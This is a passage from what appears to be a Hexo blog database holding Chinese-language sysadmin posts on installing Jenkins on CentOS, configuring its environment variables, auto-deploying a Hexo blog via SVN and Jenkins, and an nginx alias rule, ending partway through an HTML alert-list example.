https://pkg.jenkins.io/redhat-stable/jenkins.io.key</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-安装jenkins\"><a href=\"#2-安装jenkins\" class=\"headerlink\" title=\"2.安装jenkins\"></a>2.安装jenkins</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install jenkins</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-修改jenkins默认端口号\"><a href=\"#3-修改jenkins默认端口号\" class=\"headerlink\" title=\"3.修改jenkins默认端口号\"></a>3.修改jenkins默认端口号</h3><p>jenkins默认端口号8080，如果要修改请<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/sysconfig/jenkins</span><br></pre></td></tr></table></figure></p>\n<p>找到<code>JENKINS_PORT=&quot;8080&quot;</code>修改即可</p>\n<h3 id=\"4-启动jenkins\"><a href=\"#4-启动jenkins\" class=\"headerlink\" title=\"4.启动jenkins\"></a>4.启动jenkins</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service jenkins start</span><br></pre></td></tr></table></figure>\n<ul>\n<li>停止和重启分别用下边的命令</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service jenkins stop <span class=\"comment\">#停止</span></span><br><span class=\"line\">service jenkins restart <span class=\"comment\">#重启</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>安装成功后Jenkins将作为一个守护进程随系统启动</li>\n</ul>\n<h3 id=\"5-打开jenkins\"><a href=\"#5-打开jenkins\" class=\"headerlink\" title=\"5.打开jenkins\"></a>5.打开jenkins</h3><p>浏览器输入服务器地址加上端口号，例如<code>http://190.168.1.2:8080/</code></p>\n<p>首次打开会让你输入密码，密码在<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /var/lib/jenkins/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure></p>\n<p>复制进去即可</p>\n<p>之后可以默认安装推荐插件，配置用户名密码，安装完成。</p>\n<h3 id=\"6-更新jenkins\"><a href=\"#6-更新jenkins\" class=\"headerlink\" title=\"6.更新jenkins\"></a>6.更新jenkins</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum update jenkins</span><br></pre></td></tr></table></figure>\n<p>这种方式可能无法更新到最新的jenkins，需要手动在磁盘查找<code>jenkins.war</code>并替换</p>\n<ul>\n<li><p>停止jenkins<code>service jenkins stop</code></p>\n</li>\n<li><p><code>rpm -ql jenkins</code>找到<code>jenkins.war</code>，然后官网下载最新的替换</p>\n</li>\n<li><p>启动jenkins<code>service jenkins start</code></p>\n</li>\n</ul>"},{"title":"centos中jenkins配置环境变量","date":"2020-11-03T10:22:55.000Z","_content":"\n起由：在Jenkins配置脚本期望执行npm命令，但实际没有执行，也没有报错\n<!--more-->\n\n### 1.获取系统环境变量\n\n```sh\necho $PATH\n```\n\n得到如下，复制它\n```\n/root/.pyenv/shims:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin\n```\n\n### 2.配置jenkins\n\n系统管理-系统配置-全局属性-环境变量-新增-粘贴-保存  \n如图\n\n![248-1.jpg](/imgs/248/248-1.png)","source":"_posts/post248.md","raw":"---\ntitle: centos中jenkins配置环境变量\ndate: 2020-11-03 18:22:55\ntags: [运维,持续集成]\n---\n\n起由：在Jenkins配置脚本期望执行npm命令，但实际没有执行，也没有报错\n<!--more-->\n\n### 1.获取系统环境变量\n\n```sh\necho $PATH\n```\n\n得到如下，复制它\n```\n/root/.pyenv/shims:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin\n```\n\n### 2.配置jenkins\n\n系统管理-系统配置-全局属性-环境变量-新增-粘贴-保存  \n如图\n\n![248-1.jpg](/imgs/248/248-1.png)","slug":"post248","published":1,"updated":"2020-12-07T02:14:24.033Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5re0002yq0szbb2k2tcx","content":"<p>起由：在Jenkins配置脚本期望执行npm命令，但实际没有执行，也没有报错<br><a id=\"more\"></a></p>\n<h3 id=\"1-获取系统环境变量\"><a href=\"#1-获取系统环境变量\" class=\"headerlink\" title=\"1.获取系统环境变量\"></a>1.获取系统环境变量</h3><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$PATH</span></span><br></pre></td></tr></table></figure>\n<p>得到如下，复制它<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/root/.pyenv/shims:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-配置jenkins\"><a href=\"#2-配置jenkins\" class=\"headerlink\" title=\"2.配置jenkins\"></a>2.配置jenkins</h3><p>系统管理-系统配置-全局属性-环境变量-新增-粘贴-保存<br>如图</p>\n<p><img src=\"/imgs/248/248-1.png\" alt=\"248-1.jpg\"></p>\n","site":{"data":{}},"excerpt":"<p>起由：在Jenkins配置脚本期望执行npm命令，但实际没有执行，也没有报错<br>","more":"</p>\n<h3 id=\"1-获取系统环境变量\"><a href=\"#1-获取系统环境变量\" class=\"headerlink\" title=\"1.获取系统环境变量\"></a>1.获取系统环境变量</h3><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$PATH</span></span><br></pre></td></tr></table></figure>\n<p>得到如下，复制它<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/root/.pyenv/shims:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-配置jenkins\"><a href=\"#2-配置jenkins\" class=\"headerlink\" title=\"2.配置jenkins\"></a>2.配置jenkins</h3><p>系统管理-系统配置-全局属性-环境变量-新增-粘贴-保存<br>如图</p>\n<p><img src=\"/imgs/248/248-1.png\" alt=\"248-1.jpg\"></p>"},{"title":"centos下hexo + svn + jenkins实现博客自动部署","date":"2020-11-04T01:53:02.000Z","_content":"\n起由：hexo是一个很好用的轻量级博客系统，生成纯静态相对安全而且高性能，但是每次写完博文都需要手动生成静态文件，部署到服务器，影响生活，于是就考虑使用jenkins实现自动部署。\n\n<!--more-->\n\n### 如果希望通过github的actions来实现，可以参考[Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器](https://blog.ctftools.com/2021/07/newpost-18/)\n\n## 一、前提\n\n会用[hexo](/2017/12/post233/)、[svn](/2020/11/post246/)，拥有自己的服务器，安装好[jenkins](/2020/11/post247/)，并把hexo目录中文件同步到svn，其中`db.json`、`public/`、`node_modules/`无需上传，本文假设你已经把它上传到`svn://xxx.cn/hexo`，svn账号密码都为`admin`。\n\n## 二、准备\n\n### 1.系统安装[node.js](https://nodejs.org/zh-cn/download/)\n\n```bash\ncd /home\nmkdir node\ncd /node\nwget https://nodejs.org/dist/v14.15.0/node-v14.15.0-linux-x64.tar.xz\ntar -xf node-v14.15.0-linux-x64.tar.xz\ncd node-v14.15.0-linux-x64\nln -s /home/node/node-v14.15.0-linux-x64/bin/node /usr/local/bin/\nln -s /home/node/node-v14.15.0-linux-x64/bin/npm /usr/local/bin/\n```\n\n### 2.安装hexo\n\n```shell\nnpm install hexo-cli -g\n```\n\n### 3.配置环境变量\n\n参考[这篇博文](/2020/11/post248/)\n\n## 三、jenkins配置\n\n* 登录到jenkins，进入系统管理-插件管理，点击可选插件，搜索SVN，找到[SVN 1.4 Compatibility Plugin](https://plugins.jenkins.io/svncompat14)并安装。\n\n* 点击右上角用户的下拉，点击凭据，如图\n\n  ![249-2.png](/imgs/249/249-2.png)\n\n* 点击域-全局下拉-添加凭据，如图\n\n  ![249-3.png](/imgs/249/249-3.png)\n\n* 输入SVN账号，密码，ID(自己造)和描述，点击确定，如图\n\n  ![249-4.png](/imgs/249/249-4.png)\n\n* 进入jenkins首页，左上角新建任务，输入任务名，选择构建自由风格项目，点击确定，如图\n\n![249-1.png](/imgs/249/249-1.png)\n\n* 确定后会进入配置页面，输入描述，例如hexo自动构建，勾选`丢弃旧的构建`，`保持构建的最大个数`建议输入10，`源码管理`选`Subversion`，然后输入svn地址、选择svn账号，如图\n\n![249-5.png](/imgs/249/249-5.png)\n\n* `构建`中点击`增加构建步骤`，点击`执行shell`，命令如下\n\n  ```bash\n  #!/bin/bash\n  rm -rf ./hexo.zip #如果不需要归档，则删除此行\n  npm install --unsafe-perm\n  hexo clean\n  hexo g\n  cd public #如果不需要归档，则删除此行\n  zip -r ../hexo.zip ./* #如果不需要归档，则删除此行\n  ```\n\n* （可选归档）`构建后操作`中`增加构建后操作步骤`，点击`归档成品`，`用于存档的文件`输入`hexo.zip`。\n\n* 保存后进入刚创建的任务，点击`立即构建`，进入`构建历史`中找到正在构建的任务，点进去查看`控制台输出`，如果最后返回`Finished: SUCCESS`则说明构建成功。\n\n* 构建的`控制台输出`开头会告诉你构建位置，如图，可知构建在`/var/lib/jenkins/workspace/blog`\n\n![249-6.png](/imgs/249/249-6.png)\n\n* 将nginx指向`/var/lib/jenkins/workspace/blog/public`，打开nginx中配置的链接即可访问博客。","source":"_posts/post249.md","raw":"---\ntitle: centos下hexo + svn + jenkins实现博客自动部署\ndate: 2020-11-04 09:53:02\ntags: [运维,持续集成]\n---\n\n起由：hexo是一个很好用的轻量级博客系统，生成纯静态相对安全而且高性能，但是每次写完博文都需要手动生成静态文件，部署到服务器，影响生活，于是就考虑使用jenkins实现自动部署。\n\n<!--more-->\n\n### 如果希望通过github的actions来实现，可以参考[Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器](https://blog.ctftools.com/2021/07/newpost-18/)\n\n## 一、前提\n\n会用[hexo](/2017/12/post233/)、[svn](/2020/11/post246/)，拥有自己的服务器，安装好[jenkins](/2020/11/post247/)，并把hexo目录中文件同步到svn，其中`db.json`、`public/`、`node_modules/`无需上传，本文假设你已经把它上传到`svn://xxx.cn/hexo`，svn账号密码都为`admin`。\n\n## 二、准备\n\n### 1.系统安装[node.js](https://nodejs.org/zh-cn/download/)\n\n```bash\ncd /home\nmkdir node\ncd /node\nwget https://nodejs.org/dist/v14.15.0/node-v14.15.0-linux-x64.tar.xz\ntar -xf node-v14.15.0-linux-x64.tar.xz\ncd node-v14.15.0-linux-x64\nln -s /home/node/node-v14.15.0-linux-x64/bin/node /usr/local/bin/\nln -s /home/node/node-v14.15.0-linux-x64/bin/npm /usr/local/bin/\n```\n\n### 2.安装hexo\n\n```shell\nnpm install hexo-cli -g\n```\n\n### 3.配置环境变量\n\n参考[这篇博文](/2020/11/post248/)\n\n## 三、jenkins配置\n\n* 登录到jenkins，进入系统管理-插件管理，点击可选插件，搜索SVN，找到[SVN 1.4 Compatibility Plugin](https://plugins.jenkins.io/svncompat14)并安装。\n\n* 点击右上角用户的下拉，点击凭据，如图\n\n  ![249-2.png](/imgs/249/249-2.png)\n\n* 点击域-全局下拉-添加凭据，如图\n\n  ![249-3.png](/imgs/249/249-3.png)\n\n* 输入SVN账号，密码，ID(自己造)和描述，点击确定，如图\n\n  ![249-4.png](/imgs/249/249-4.png)\n\n* 进入jenkins首页，左上角新建任务，输入任务名，选择构建自由风格项目，点击确定，如图\n\n![249-1.png](/imgs/249/249-1.png)\n\n* 确定后会进入配置页面，输入描述，例如hexo自动构建，勾选`丢弃旧的构建`，`保持构建的最大个数`建议输入10，`源码管理`选`Subversion`，然后输入svn地址、选择svn账号，如图\n\n![249-5.png](/imgs/249/249-5.png)\n\n* `构建`中点击`增加构建步骤`，点击`执行shell`，命令如下\n\n  ```bash\n  #!/bin/bash\n  rm -rf ./hexo.zip #如果不需要归档，则删除此行\n  npm install --unsafe-perm\n  hexo clean\n  hexo g\n  cd public #如果不需要归档，则删除此行\n  zip -r ../hexo.zip ./* #如果不需要归档，则删除此行\n  ```\n\n* （可选归档）`构建后操作`中`增加构建后操作步骤`，点击`归档成品`，`用于存档的文件`输入`hexo.zip`。\n\n* 保存后进入刚创建的任务，点击`立即构建`，进入`构建历史`中找到正在构建的任务，点进去查看`控制台输出`，如果最后返回`Finished: SUCCESS`则说明构建成功。\n\n* 构建的`控制台输出`开头会告诉你构建位置，如图，可知构建在`/var/lib/jenkins/workspace/blog`\n\n![249-6.png](/imgs/249/249-6.png)\n\n* 将nginx指向`/var/lib/jenkins/workspace/blog/public`，打开nginx中配置的链接即可访问博客。","slug":"post249","published":1,"updated":"2021-07-27T05:52:37.797Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5re10030q0sz5ww4wadn","content":"<p>起由：hexo是一个很好用的轻量级博客系统，生成纯静态相对安全而且高性能，但是每次写完博文都需要手动生成静态文件，部署到服务器，影响生活，于是就考虑使用jenkins实现自动部署。</p>\n<a id=\"more\"></a>\n<h3 id=\"如果希望通过github的actions来实现，可以参考Hexo-Github-Actions-实现提交代码自动部署并通过FTP传到云服务器\"><a href=\"#如果希望通过github的actions来实现，可以参考Hexo-Github-Actions-实现提交代码自动部署并通过FTP传到云服务器\" class=\"headerlink\" title=\"如果希望通过github的actions来实现，可以参考Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器\"></a>如果希望通过github的actions来实现，可以参考<a href=\"https://blog.ctftools.com/2021/07/newpost-18/\">Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器</a></h3><h2 id=\"一、前提\"><a href=\"#一、前提\" class=\"headerlink\" title=\"一、前提\"></a>一、前提</h2><p>会用<a href=\"/2017/12/post233/\">hexo</a>、<a href=\"/2020/11/post246/\">svn</a>，拥有自己的服务器，安装好<a href=\"/2020/11/post247/\">jenkins</a>，并把hexo目录中文件同步到svn，其中<code>db.json</code>、<code>public/</code>、<code>node_modules/</code>无需上传，本文假设你已经把它上传到<code>svn://xxx.cn/hexo</code>，svn账号密码都为<code>admin</code>。</p>\n<h2 id=\"二、准备\"><a href=\"#二、准备\" class=\"headerlink\" title=\"二、准备\"></a>二、准备</h2><h3 id=\"1-系统安装node-js\"><a href=\"#1-系统安装node-js\" class=\"headerlink\" title=\"1.系统安装node.js\"></a>1.系统安装<a href=\"https://nodejs.org/zh-cn/download/\" target=\"_blank\" rel=\"noopener\">node.js</a></h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /home</span><br><span class=\"line\">mkdir node</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /node</span><br><span class=\"line\">wget https://nodejs.org/dist/v14.15.0/node-v14.15.0-linux-x64.tar.xz</span><br><span class=\"line\">tar -xf node-v14.15.0-linux-x64.tar.xz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> node-v14.15.0-linux-x64</span><br><span class=\"line\">ln -s /home/node/node-v14.15.0-linux-x64/bin/node /usr/<span class=\"built_in\">local</span>/bin/</span><br><span class=\"line\">ln -s /home/node/node-v14.15.0-linux-x64/bin/npm /usr/<span class=\"built_in\">local</span>/bin/</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-安装hexo\"><a href=\"#2-安装hexo\" class=\"headerlink\" title=\"2.安装hexo\"></a>2.安装hexo</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-配置环境变量\"><a href=\"#3-配置环境变量\" class=\"headerlink\" title=\"3.配置环境变量\"></a>3.配置环境变量</h3><p>参考<a href=\"/2020/11/post248/\">这篇博文</a></p>\n<h2 id=\"三、jenkins配置\"><a href=\"#三、jenkins配置\" class=\"headerlink\" title=\"三、jenkins配置\"></a>三、jenkins配置</h2><ul>\n<li><p>登录到jenkins，进入系统管理-插件管理，点击可选插件，搜索SVN，找到<a href=\"https://plugins.jenkins.io/svncompat14\" target=\"_blank\" rel=\"noopener\">SVN 1.4 Compatibility Plugin</a>并安装。</p>\n</li>\n<li><p>点击右上角用户的下拉，点击凭据，如图</p>\n<p><img src=\"/imgs/249/249-2.png\" alt=\"249-2.png\"></p>\n</li>\n<li><p>点击域-全局下拉-添加凭据，如图</p>\n<p><img src=\"/imgs/249/249-3.png\" alt=\"249-3.png\"></p>\n</li>\n<li><p>输入SVN账号，密码，ID(自己造)和描述，点击确定，如图</p>\n<p><img src=\"/imgs/249/249-4.png\" alt=\"249-4.png\"></p>\n</li>\n<li><p>进入jenkins首页，左上角新建任务，输入任务名，选择构建自由风格项目，点击确定，如图</p>\n</li>\n</ul>\n<p><img src=\"/imgs/249/249-1.png\" alt=\"249-1.png\"></p>\n<ul>\n<li>确定后会进入配置页面，输入描述，例如hexo自动构建，勾选<code>丢弃旧的构建</code>，<code>保持构建的最大个数</code>建议输入10，<code>源码管理</code>选<code>Subversion</code>，然后输入svn地址、选择svn账号，如图</li>\n</ul>\n<p><img src=\"/imgs/249/249-5.png\" alt=\"249-5.png\"></p>\n<ul>\n<li><p><code>构建</code>中点击<code>增加构建步骤</code>，点击<code>执行shell</code>，命令如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">rm -rf ./hexo.zip <span class=\"comment\">#如果不需要归档，则删除此行</span></span><br><span class=\"line\">npm install --unsafe-perm</span><br><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\"><span class=\"built_in\">cd</span> public <span class=\"comment\">#如果不需要归档，则删除此行</span></span><br><span class=\"line\">zip -r ../hexo.zip ./* <span class=\"comment\">#如果不需要归档，则删除此行</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>（可选归档）<code>构建后操作</code>中<code>增加构建后操作步骤</code>，点击<code>归档成品</code>，<code>用于存档的文件</code>输入<code>hexo.zip</code>。</p>\n</li>\n<li><p>保存后进入刚创建的任务，点击<code>立即构建</code>，进入<code>构建历史</code>中找到正在构建的任务，点进去查看<code>控制台输出</code>，如果最后返回<code>Finished: SUCCESS</code>则说明构建成功。</p>\n</li>\n<li><p>构建的<code>控制台输出</code>开头会告诉你构建位置，如图，可知构建在<code>/var/lib/jenkins/workspace/blog</code></p>\n</li>\n</ul>\n<p><img src=\"/imgs/249/249-6.png\" alt=\"249-6.png\"></p>\n<ul>\n<li>将nginx指向<code>/var/lib/jenkins/workspace/blog/public</code>，打开nginx中配置的链接即可访问博客。</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>起由：hexo是一个很好用的轻量级博客系统，生成纯静态相对安全而且高性能，但是每次写完博文都需要手动生成静态文件，部署到服务器，影响生活，于是就考虑使用jenkins实现自动部署。</p>","more":"<h3 id=\"如果希望通过github的actions来实现，可以参考Hexo-Github-Actions-实现提交代码自动部署并通过FTP传到云服务器\"><a href=\"#如果希望通过github的actions来实现，可以参考Hexo-Github-Actions-实现提交代码自动部署并通过FTP传到云服务器\" class=\"headerlink\" title=\"如果希望通过github的actions来实现，可以参考Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器\"></a>如果希望通过github的actions来实现，可以参考<a href=\"https://blog.ctftools.com/2021/07/newpost-18/\">Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器</a></h3><h2 id=\"一、前提\"><a href=\"#一、前提\" class=\"headerlink\" title=\"一、前提\"></a>一、前提</h2><p>会用<a href=\"/2017/12/post233/\">hexo</a>、<a href=\"/2020/11/post246/\">svn</a>，拥有自己的服务器，安装好<a href=\"/2020/11/post247/\">jenkins</a>，并把hexo目录中文件同步到svn，其中<code>db.json</code>、<code>public/</code>、<code>node_modules/</code>无需上传，本文假设你已经把它上传到<code>svn://xxx.cn/hexo</code>，svn账号密码都为<code>admin</code>。</p>\n<h2 id=\"二、准备\"><a href=\"#二、准备\" class=\"headerlink\" title=\"二、准备\"></a>二、准备</h2><h3 id=\"1-系统安装node-js\"><a href=\"#1-系统安装node-js\" class=\"headerlink\" title=\"1.系统安装node.js\"></a>1.系统安装<a href=\"https://nodejs.org/zh-cn/download/\" target=\"_blank\" rel=\"noopener\">node.js</a></h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /home</span><br><span class=\"line\">mkdir node</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /node</span><br><span class=\"line\">wget https://nodejs.org/dist/v14.15.0/node-v14.15.0-linux-x64.tar.xz</span><br><span class=\"line\">tar -xf node-v14.15.0-linux-x64.tar.xz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> node-v14.15.0-linux-x64</span><br><span class=\"line\">ln -s /home/node/node-v14.15.0-linux-x64/bin/node /usr/<span class=\"built_in\">local</span>/bin/</span><br><span class=\"line\">ln -s /home/node/node-v14.15.0-linux-x64/bin/npm /usr/<span class=\"built_in\">local</span>/bin/</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-安装hexo\"><a href=\"#2-安装hexo\" class=\"headerlink\" title=\"2.安装hexo\"></a>2.安装hexo</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-配置环境变量\"><a href=\"#3-配置环境变量\" class=\"headerlink\" title=\"3.配置环境变量\"></a>3.配置环境变量</h3><p>参考<a href=\"/2020/11/post248/\">这篇博文</a></p>\n<h2 id=\"三、jenkins配置\"><a href=\"#三、jenkins配置\" class=\"headerlink\" title=\"三、jenkins配置\"></a>三、jenkins配置</h2><ul>\n<li><p>登录到jenkins，进入系统管理-插件管理，点击可选插件，搜索SVN，找到<a href=\"https://plugins.jenkins.io/svncompat14\" target=\"_blank\" rel=\"noopener\">SVN 1.4 Compatibility Plugin</a>并安装。</p>\n</li>\n<li><p>点击右上角用户的下拉，点击凭据，如图</p>\n<p><img src=\"/imgs/249/249-2.png\" alt=\"249-2.png\"></p>\n</li>\n<li><p>点击域-全局下拉-添加凭据，如图</p>\n<p><img src=\"/imgs/249/249-3.png\" alt=\"249-3.png\"></p>\n</li>\n<li><p>输入SVN账号，密码，ID(自己造)和描述，点击确定，如图</p>\n<p><img src=\"/imgs/249/249-4.png\" alt=\"249-4.png\"></p>\n</li>\n<li><p>进入jenkins首页，左上角新建任务，输入任务名，选择构建自由风格项目，点击确定，如图</p>\n</li>\n</ul>\n<p><img src=\"/imgs/249/249-1.png\" alt=\"249-1.png\"></p>\n<ul>\n<li>确定后会进入配置页面，输入描述，例如hexo自动构建，勾选<code>丢弃旧的构建</code>，<code>保持构建的最大个数</code>建议输入10，<code>源码管理</code>选<code>Subversion</code>，然后输入svn地址、选择svn账号，如图</li>\n</ul>\n<p><img src=\"/imgs/249/249-5.png\" alt=\"249-5.png\"></p>\n<ul>\n<li><p><code>构建</code>中点击<code>增加构建步骤</code>，点击<code>执行shell</code>，命令如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">rm -rf ./hexo.zip <span class=\"comment\">#如果不需要归档，则删除此行</span></span><br><span class=\"line\">npm install --unsafe-perm</span><br><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\"><span class=\"built_in\">cd</span> public <span class=\"comment\">#如果不需要归档，则删除此行</span></span><br><span class=\"line\">zip -r ../hexo.zip ./* <span class=\"comment\">#如果不需要归档，则删除此行</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>（可选归档）<code>构建后操作</code>中<code>增加构建后操作步骤</code>，点击<code>归档成品</code>，<code>用于存档的文件</code>输入<code>hexo.zip</code>。</p>\n</li>\n<li><p>保存后进入刚创建的任务，点击<code>立即构建</code>，进入<code>构建历史</code>中找到正在构建的任务，点进去查看<code>控制台输出</code>，如果最后返回<code>Finished: SUCCESS</code>则说明构建成功。</p>\n</li>\n<li><p>构建的<code>控制台输出</code>开头会告诉你构建位置，如图，可知构建在<code>/var/lib/jenkins/workspace/blog</code></p>\n</li>\n</ul>\n<p><img src=\"/imgs/249/249-6.png\" alt=\"249-6.png\"></p>\n<ul>\n<li>将nginx指向<code>/var/lib/jenkins/workspace/blog/public</code>，打开nginx中配置的链接即可访问博客。</li>\n</ul>"},{"title":"nginx代理网站子目录到本地目录","date":"2020-11-12T05:54:49.000Z","_content":"\n使用nginx的alias即可，例如下边的配置将子目录`static_web`代理到`/www/wwwroot/bg.ctftools.com`路径，访问`http://xxx.xx/static_web/index.html`即可达`/www/wwwroot/bg.ctftools.com/index.html`\n\n```nginx\nlocation ^~ /static_web {\n    alias /www/wwwroot/bg.ctftools.com;\n    index index.html;\n    try_files $uri $uri/ /static_web/index.html;\n}\n```","source":"_posts/post251.md","raw":"---\ntitle: nginx代理网站子目录到本地目录\ndate: 2020-11-12 13:54:49\ntags: 运维\n---\n\n使用nginx的alias即可，例如下边的配置将子目录`static_web`代理到`/www/wwwroot/bg.ctftools.com`路径，访问`http://xxx.xx/static_web/index.html`即可达`/www/wwwroot/bg.ctftools.com/index.html`\n\n```nginx\nlocation ^~ /static_web {\n    alias /www/wwwroot/bg.ctftools.com;\n    index index.html;\n    try_files $uri $uri/ /static_web/index.html;\n}\n```","slug":"post251","published":1,"updated":"2020-11-12T08:37:49.522Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5re20033q0szbpmy2ybw","content":"<p>使用nginx的alias即可，例如下边的配置将子目录<code>static_web</code>代理到<code>/www/wwwroot/bg.ctftools.com</code>路径，访问<code>http://xxx.xx/static_web/index.html</code>即可达<code>/www/wwwroot/bg.ctftools.com/index.html</code></p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span><span class=\"regexp\"> ^~</span> /static_web &#123;</span><br><span class=\"line\">    <span class=\"attribute\">alias</span> /www/wwwroot/bg.ctftools.com;</span><br><span class=\"line\">    <span class=\"attribute\">index</span> index.html;</span><br><span class=\"line\">    <span class=\"attribute\">try_files</span> <span class=\"variable\">$uri</span> <span class=\"variable\">$uri</span>/ /static_web/index.html;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>使用nginx的alias即可，例如下边的配置将子目录<code>static_web</code>代理到<code>/www/wwwroot/bg.ctftools.com</code>路径，访问<code>http://xxx.xx/static_web/index.html</code>即可达<code>/www/wwwroot/bg.ctftools.com/index.html</code></p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span><span class=\"regexp\"> ^~</span> /static_web &#123;</span><br><span class=\"line\">    <span class=\"attribute\">alias</span> /www/wwwroot/bg.ctftools.com;</span><br><span class=\"line\">    <span class=\"attribute\">index</span> index.html;</span><br><span class=\"line\">    <span class=\"attribute\">try_files</span> <span class=\"variable\">$uri</span> <span class=\"variable\">$uri</span>/ /static_web/index.html;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"h5实现一种自动滚动的告警列表","date":"2020-11-12T06:25:44.000Z","_content":"\n\n\n* [点击这里看效果](https://blog.ctftools.com/static_web/wrnList/index.html)，鼠标悬浮到告警列表会停止。\n\n<!--more-->\n\n* 点击下载[wrnList.zip](https://blog.ctftools.com/static_web/wrnList/wrnList.zip) 。\n\n* `index.html`\n\n```html\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<meta charset=\"utf-8\" />\n\t\t<title>告警</title>\n\t\t<link rel=\"stylesheet\" type=\"text/css\" 